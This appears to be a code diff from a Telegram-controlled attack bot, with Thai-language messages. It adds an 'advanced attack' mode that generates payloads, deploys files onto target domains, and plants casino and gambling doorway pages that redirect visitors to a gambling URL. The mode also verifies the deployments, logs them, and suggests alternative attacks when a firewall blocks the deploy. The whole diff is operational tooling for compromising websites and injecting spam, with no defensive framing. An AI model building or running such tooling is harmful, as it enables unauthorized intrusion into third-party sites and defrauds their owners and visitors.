@@ -3475,6 +3475,148 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         `🎯 Session #${session.sessionId} กำลังทำงานใน background\n` +
         `⏱ Setup: ${formatDuration(agenticDuration)}`
       );
+      
+    } else if (method === "advanced_all" || method === "deploy_advanced_all" || method.startsWith("advanced_") || method.startsWith("deploy_advanced_")) {
+      // Advanced attack — generate payloads + deploy
+      const isDeployMode = method.startsWith("deploy_");
+      const technique = method.replace("deploy_advanced_", "").replace("advanced_", "") || "all";
+      const techLabel = technique === "all" ? "รวม 5 เทคนิค" : technique;
+      const modeLabel = isDeployMode ? "Deploy Advanced" : "Advanced Attack";
+      
+      await updateProgress(`Starting ${modeLabel}: ${techLabel}`, "running");
+      const s1 = Date.now();
+      
+      // Get redirect URL
+      let redirectUrl: string;
+      try {
+        const { pickRedirectUrl } = await import("./agentic-attack-engine");
+        redirectUrl = await pickRedirectUrl();
+      } catch {
+        redirectUrl = "https://gambling-site.example.com";
+      }
+      timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
+      stepIndex++;
+      
+      if (isDeployMode) {
+        // Deploy mode: generate + deploy + verify
+        await updateProgress("Phase 1: Generating payloads", "running");
+        const s2 = Date.now();
+        
+        const { generateAndDeployAdvanced } = await import("./advanced-deploy-engine");
+        const { generation, deployment } = await generateAndDeployAdvanced(domain, redirectUrl, {
+          techniques: technique === "all" ? undefined : [technique],
+          userId: 1,
+          onProgress: async (event) => {
+            try {
+              const bar = Array.from({ length: 10 }, (_, i) => i < Math.floor(event.progress / 10) ? "█" : "░").join("");
+              await editTelegramMessage(config, chatId, progressMsgId,
+                `🚀 ${modeLabel}: ${techLabel} บน ${domain}\n\n[${bar}] ${event.progress}%\n${event.detail}`);
+            } catch { /* ignore progress update errors */ }
+          },
+        });
+        
+        const deployMs = Date.now() - s2;
+        timings.push({
+          step: `Generated: ${generation.totalPayloads} payloads, ${generation.totalFiles} files`,
+          ms: deployMs / 2,
+          ok: generation.totalPayloads > 0,
+        });
+        stepIndex++;
+        timings.push({
+          step: `Deployed: ${deployment.deployedFiles}/${deployment.totalFiles}, Verified: ${deployment.verifiedFiles}`,
+          ms: deployMs / 2,
+          ok: deployment.deployedFiles > 0,
+        });
+        stepIndex++;
+        
+        const success = deployment.deployedFiles > 0;
+        await updateProgress("Done", success ? "done" : "failed");
+        
+        // Save attack log
+        await saveAttackLog({
+          targetDomain: domain,
+          method,
+          success,
+          durationMs: deployMs,
+          redirectUrl,
+          uploadedUrl: deployment.deployedUrls[0]?.url,
+          aiReasoning: `${modeLabel}: ${generation.totalPayloads} payloads, ${deployment.deployedFiles} deployed, ${deployment.verifiedFiles} verified`,
+        });
+        
+        // Send NEW completion notification
+        if (success) {
+          let msg = `🔔 ${modeLabel} เสร็จแล้ว!\n\n`;
+          msg += `✅ ${domain}\n`;
+          msg += `📦 Payloads: ${generation.totalPayloads} | Deployed: ${deployment.deployedFiles} | Verified: ${deployment.verifiedFiles}\n`;
+          if (deployment.deployedUrls.length > 0) {
+            msg += `🔗 ${deployment.deployedUrls[0].url.substring(0, 60)}\n`;
+          }
+          msg += `⏱ ${formatDuration(deployMs)}`;
+          await sendTelegramReply(config, chatId, msg);
+        } else {
+          await sendTelegramReply(config, chatId,
+            `🔔 ${modeLabel} เสร็จแล้ว (deploy ไม่สำเร็จ)\n\n` +
+            `❌ ${domain}\n` +
+            `📦 Payloads: ${generation.totalPayloads} | Deploy: 0\n` +
+            `⚠️ เว็บอาจมี WAF/firewall ป้องกัน\n` +
+            `⏱ ${formatDuration(deployMs)}`
+          );
+          await sendAlternativeAttackSuggestions(config, chatId, domain, method, {
+            errorMessage: `Deploy failed: 0/${deployment.totalFiles} files deployed`,
+          });
+        }
+        
+      } else {
+        // Generate-only mode: just create payloads (no deploy)
+        await updateProgress("Generating advanced payloads", "running");
+        const s2 = Date.now();
+        
+        const { runAdvancedAttack } = await import("./advanced-attack-engine");
+        const report = await runAdvancedAttack(domain, redirectUrl, {
+          keywords: ["casino", "gambling", "slots"],
+          doorwayCount: 50,
+          useAiAnalysis: true,
+        });
+        
+        const genMs = Date.now() - s2;
+        const techSummaries = report.techniques.map(t => `${t.technique}: ${t.payloads.length} payloads`).join(", ");
+        timings.push({
+          step: `Generated: ${report.totalPayloads} payloads (${techSummaries})`,
+          ms: genMs,
+          ok: report.totalPayloads > 0,
+        });
+        stepIndex++;
+        
+        const success = report.totalPayloads > 0;
+        await updateProgress("Done", success ? "done" : "failed");
+        
+        // Save attack log
+        await saveAttackLog({
+          targetDomain: domain,
+          method,
+          success,
+          durationMs: genMs,
+          redirectUrl,
+          aiReasoning: `Advanced Attack: ${report.totalPayloads} payloads, ${report.totalFiles} files. ${report.aiAnalysis || ""}`,
+        });
+        
+        // Send NEW completion notification
+        let msg = `🔔 Advanced Attack เสร็จแล้ว!\n\n`;
+        msg += `${success ? "✅" : "❌"} ${domain}\n`;
+        msg += `📦 Payloads: ${report.totalPayloads} | Files: ${report.totalFiles}\n`;
+        msg += `🔧 Techniques: ${report.techniques.map(t => t.technique).join(", ")}\n`;
+        if (report.aiAnalysis) {
+          msg += `🤖 ${report.aiAnalysis.substring(0, 100)}\n`;
+        }
+        msg += `⏱ ${formatDuration(genMs)}`;
+        await sendTelegramReply(config, chatId, msg);
+        
+        if (!success) {
+          await sendAlternativeAttackSuggestions(config, chatId, domain, method, {
+            errorMessage: "Advanced attack generated 0 payloads",
+          });
+        }
+      }
     }
   } catch (error: any) {
     timings.push({ step: `Error: ${error.message}`, ms: 0, ok: false });
